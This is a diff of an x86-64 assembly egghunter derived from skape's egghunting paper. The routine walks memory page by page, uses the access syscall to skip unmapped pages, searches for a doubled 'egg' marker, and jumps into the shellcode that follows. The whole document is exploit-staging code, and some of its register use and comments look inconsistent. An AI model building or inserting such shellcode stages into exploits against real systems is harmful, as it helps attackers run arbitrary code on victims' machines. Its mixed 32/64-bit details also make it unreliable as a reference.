@@ -1,48 +1,32 @@
 ; David @InfinitelyManic
-; derived from http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf 
-;   
-section .data
+; code derived from http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf 
+; nasm -felf64 -g -F dwarf egghunter.s -o egghunter.o && ld egghunter.o -o egghunter
 section .text
 	global _start
 _start:
-	mov rbx, 0x50905090	; egg
-	xor ecx, ecx
-	mul ecx			; init rax, rdx
-.endofpage:
-	or dx, 0xfff		; page alignment  - less 1 to avoid nulls
-.next:	
-	inc edx			; 0x1000= 4096 PAGE
-
-	push rax
-	push rbx
-	push rcx
-	push rdx
-	push rdi
-
-	lea rdi, [rdx+0x8]	; get nbytes from this mem location 
-	mov al, 21		; access syscall 
+	xor edx, edx
+L0:
+	or dx, 0xfff			; prep 4096 PAGE_SIZE boundary - no nulls
+L1:
+	inc edx				; 0x...1000 = 4096 PAGE_SIZE, 0x1000++
+	
+	lea ebx, [edx+0x4]		; access address 
+	push byte 21			; 0x21 for 32-bit; don't get it confused 
+	pop rax				; access syscall 
 	syscall 
-	cmp al, 0xf2		; error no = EFAULT
 
-	pop rdi	
-	pop rdx
-	pop rcx
-	pop rbx
-	pop rax
+	cmp al, 0xf2			; is error EFAULT?
+	jz L0
+
+	mov eax, 0x50905090		; egg - NOP slide
+	mov edi, edx			; scas base
+	scasd				; search for egg then inc 4 bytes
+	jnz L1				; if egg not found then inc addr
+	scasd 				; search for egg then inc 4 bytes
+	jnz L1				; if egg not found then inc addr
+	jmp rdi				; egg found, 8 bytes are skipped, execute shellcode
 	
-	jz .endofpage
-	cmp [rdx], rbx
-	jnz .next 
-	cmp [rdx+4], rbx
-	jnz .next
-	jmp rdx			; execute code here
-	
-
-
-
-
-_exit:
+_exit:					; exit not required since we intend to find egg 
 	xor eax, eax
-	or al, 60
-	xor edi, edi
-	syscall
+	add al, 1
+	syscall 
